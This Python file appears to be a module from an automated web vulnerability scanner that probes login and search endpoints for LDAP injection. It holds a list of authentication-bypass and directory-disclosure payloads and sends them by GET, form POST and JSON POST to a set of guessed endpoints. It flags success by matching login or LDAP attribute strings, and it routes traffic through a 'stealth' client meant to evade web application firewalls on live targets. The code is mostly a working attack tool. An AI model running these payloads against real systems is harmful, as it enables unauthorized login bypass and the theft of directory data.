#!/usr/bin/env python3
"""LDAP Injection Tester

Tests for LDAP injection vulnerabilities:
- LDAP injection in authentication endpoints
- LDAP injection in search endpoints
- Authentication bypass via LDAP injection
- Information disclosure via LDAP injection

Uses stealth HTTP client for WAF evasion on live targets.
"""

import os
import time
from typing import Dict, Any, Optional, List
from urllib.parse import urlparse

# Import stealth HTTP client for WAF evasion
try:
    from tools.http_client import safe_get, safe_post, get_stealth_session
    USE_STEALTH = True
except ImportError:
    import requests
    USE_STEALTH = False
    
    def safe_get(url, **kwargs):
        return requests.get(url, **kwargs)
    
    def safe_post(url, **kwargs):
        return requests.post(url, **kwargs)


def test_ldap_injection(
    target_url: str,
    param: str = "username",
    endpoint_type: str = "auth"
) -> Dict[str, Any]:
    """Test for LDAP injection vulnerabilities
    
    Args:
        target_url: Target URL
        param: Parameter to test
        endpoint_type: Endpoint type (auth, search)
        
    Returns:
        Dict with test results
    """
    result = {
        "type": "ldap_injection",
        "test": "ldap_injection",
        "vulnerable": False,
        "url": target_url,
        "param": param,
        "injection_method": None,
        "auth_bypass": False,
        "evidence": None
    }
    
    # LDAP injection payloads
    ldap_payloads = [
        # Authentication bypass
        ("*", "ldap_wildcard"),
        ("*)(&", "ldap_and"),
        ("*)(|", "ldap_or"),
        ("*)(|(cn=*", "ldap_or_cn"),
        ("admin)(&", "ldap_admin_bypass"),
        # Information disclosure
        ("*)(uid=*", "ldap_uid_disclosure"),
        ("*)(cn=*", "ldap_cn_disclosure"),
    ]
    
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    # For search endpoints, test GET requests first
    if endpoint_type == "search":
        for payload, payload_name in ldap_payloads:
            try:
                resp = safe_get(
                    base_url,
                    params={param: payload},
                    timeout=10
                )
                
                # Check for information disclosure
                if resp.status_code == 200:
                    # Look for LDAP-specific patterns in response
                    response_text = resp.text
                    disclosure_indicators = ["uid=", "cn=", "dn=", "objectclass", "mail=", "givenname"]
                    if any(ind.lower() in response_text.lower() for ind in disclosure_indicators):
                        result["vulnerable"] = True
                        result["injection_method"] = payload_name
                        result["evidence"] = {
                            "payload": payload,
                            "method": "GET",
                            "status_code": resp.status_code,
                            "response_snippet": resp.text[:500],
                            "note": "LDAP injection information disclosure detected (GET)"
                        }
                        return result
                        
            except Exception:
                continue
    
    for payload, payload_name in ldap_payloads:
        try:
            # Try POST with form data - send payload in specified param and a dummy password
            form_data = {param: payload}
            # For auth endpoints, also send a password (doesn't matter what value for wildcard)
            if endpoint_type == "auth":
                form_data["password"] = payload  # Use same payload for password too
            
            resp = safe_post(
                base_url,
                data=form_data,
                timeout=10
            )
            
            # Check for authentication bypass indicators
            if resp.status_code == 200:
                response_lower = resp.text.lower()
                success_indicators = ["success", "welcome", "dashboard", "logged in", "authenticated", "login successful"]
                if any(ind in response_lower for ind in success_indicators):
                    result["vulnerable"] = True
                    result["injection_method"] = payload_name
                    result["auth_bypass"] = True
                    result["evidence"] = {
                        "payload": payload,
                        "method": "POST_FORM",
                        "status_code": resp.status_code,
                        "response_snippet": resp.text[:500],
                        "note": "LDAP injection authentication bypass detected"
                    }
                    return result
            
            # Check for information disclosure
            disclosure_indicators = ["uid=", "cn=", "dn=", "objectclass", "mail="]
            if any(ind.lower() in resp.text.lower() for ind in disclosure_indicators):
                result["vulnerable"] = True
                result["injection_method"] = payload_name
                result["evidence"] = {
                    "payload": payload,
                    "method": "POST_FORM",
                    "status_code": resp.status_code,
                    "response_snippet": resp.text[:500],
                    "note": "LDAP information disclosure detected"
                }
                return result
                
        except Exception:
            continue
    
    # Also try JSON API format
    for payload, payload_name in ldap_payloads:
        try:
            json_data = {param: payload}
            if endpoint_type == "auth":
                json_data["password"] = payload
            
            resp = safe_post(
                base_url,
                json=json_data,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if resp.status_code == 200:
                response_lower = resp.text.lower()
                success_indicators = ["success", "welcome", "dashboard", "logged in", "authenticated", "login successful"]
                if any(ind in response_lower for ind in success_indicators):
                    result["vulnerable"] = True
                    result["injection_method"] = payload_name
                    result["auth_bypass"] = True
                    result["evidence"] = {
                        "payload": payload,
                        "method": "POST_JSON",
                        "status_code": resp.status_code,
                        "response_snippet": resp.text[:500],
                        "note": "LDAP injection authentication bypass detected (JSON)"
                    }
                    return result
                
        except Exception:
            continue
    
    return result


def discover_ldap_endpoints(base_url: str) -> List[Dict[str, Any]]:
    """Discover endpoints that might be vulnerable to LDAP injection
    
    Args:
        base_url: Base URL
        
    Returns:
        List of dicts with url, param, and endpoint_type
    """
    endpoints = []
    
    # Common LDAP-prone endpoints and their parameters
    common_endpoints = [
        ("/login", "username", "auth"),
        ("/api/login", "username", "auth"),
        ("/auth", "username", "auth"),
        ("/authenticate", "username", "auth"),
        ("/api/search", "filter", "search"),
        ("/search", "filter", "search"),
        ("/ldap/search", "query", "search"),
        ("/api/users", "filter", "search"),
        ("/users/search", "query", "search"),
        ("/directory", "filter", "search"),
    ]
    
    for endpoint, param, ep_type in common_endpoints:
        url = f"{base_url.rstrip('/')}{endpoint}"
        endpoints.append({"url": url, "param": param, "endpoint_type": ep_type})
    
    # Also test base URL as auth endpoint
    endpoints.append({"url": base_url, "param": "username", "endpoint_type": "auth"})
    
    return endpoints


def validate_ldap_injection(
    discovery_data: Dict[str, Any]
) -> Dict[str, Any]:
    """Main validation function for LDAP injection
    
    Args:
        discovery_data: Discovery data containing target URLs
        
    Returns:
        Dict with validation results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    # Extract target from discovery data
    target = discovery_data.get("target")
    if not target:
        return results
    
    # Get param and endpoint_type from discovery data
    # Use "or" to handle None values properly
    param = discovery_data.get("param") or "username"
    endpoint_type = discovery_data.get("endpoint_type") or "auth"
    
    # Test with explicit parameters first
    test_result = test_ldap_injection(target, param=param, endpoint_type=endpoint_type)
    results["tests_run"] += 1
    if test_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].append(test_result)
    
    # Discover and test additional endpoints
    endpoints_to_test = discover_ldap_endpoints(target)
    for ep in endpoints_to_test:
        # Skip if we already tested this exact combination
        if ep["url"] == target and ep["param"] == param:
            continue
        
        test_result = test_ldap_injection(ep["url"], param=ep["param"], endpoint_type=ep["endpoint_type"])
        results["tests_run"] += 1
        if test_result["vulnerable"]:
            results["vulnerable"] = True
            results["findings"].append(test_result)
    
    return results


if __name__ == "__main__":
    import argparse
    
    ap = argparse.ArgumentParser(description="LDAP Injection Tester")
    ap.add_argument("--target", required=True, help="Target URL")
    ap.add_argument("--param", default="username", help="Parameter to test")
    args = ap.parse_args()
    
    result = test_ldap_injection(args.target, param=args.param)
    
    import json
    print(json.dumps(result, indent=2))

